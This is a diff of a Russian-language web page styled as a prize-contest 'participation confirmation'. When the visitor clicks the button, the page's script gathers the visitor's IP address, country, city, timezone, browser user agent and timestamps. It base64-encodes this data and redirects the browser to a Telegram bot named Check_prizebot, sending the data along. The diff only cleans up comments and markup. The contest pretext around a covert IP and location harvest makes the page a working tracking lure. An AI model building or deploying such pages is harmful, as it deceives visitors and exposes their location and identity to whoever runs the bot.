@@ -9,19 +9,16 @@
 
 <body>
 
-    <!-- ВИДЕО ПО ЦЕНТРУ (ЗАЦИКЛЕНОЕ) -->
     <div class="video-container">
         <video autoplay muted playsinline loop id="bgVideo">
             <source src="background.mp4" type="video/mp4">
         </video>
-
         <div class="video-glow"></div>
     </div>
 
     <div class="overlay"></div>
     <div class="glitch"></div>
 
-    <!-- Контент -->
     <div class="content">
         <h1>Подтверждение участия</h1>
 
@@ -31,16 +28,15 @@
             и времени подтверждения — это необходимо для отметки вас как участника.
         </p>
 
-        <a class="btn" id="confirmBtn">Подтвердить участие</a>
+        <button class="btn" id="confirmBtn" type="button">Подтвердить участие</button>
 
         <p class="note">
             Данные используются только для проверки выполнения условий конкурса.
         </p>
     </div>
 
-
 <script>
-document.getElementById("confirmBtn").onclick = async () => {
+document.getElementById("confirmBtn").addEventListener("click", async () => {
 
     const uid = crypto.randomUUID();
     const timestamp_local = new Date().toLocaleString();
@@ -48,7 +44,6 @@ document.getElementById("confirmBtn").onclick = async () => {
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const device = navigator.userAgent;
 
-    // Получаем IP + город + страну
     let ip = "unknown";
     let country = "unknown";
     let city = "unknown";
@@ -59,17 +54,15 @@ document.getElementById("confirmBtn").onclick = async () => {
         ip = data.ip;
         country = data.country_name;
         city = data.city;
-    } catch(e) {
-        console.log("IP не получен");
-    }
+    } catch(e){}
 
     const payload = {
-        uid: uid,
-        ip: ip,
-        country: country,
-        city: city,
-        timezone: timezone,
-        device: device,
+        uid,
+        ip,
+        country,
+        city,
+        timezone,
+        device,
         time_local: timestamp_local,
         time_utc: timestamp_utc
     };
@@ -77,7 +70,7 @@ document.getElementById("confirmBtn").onclick = async () => {
     const encoded = btoa(JSON.stringify(payload));
 
     window.location.href = "https://t.me/Check_prizebot?start=" + encoded;
-};
+});
 </script>
 
 </body>
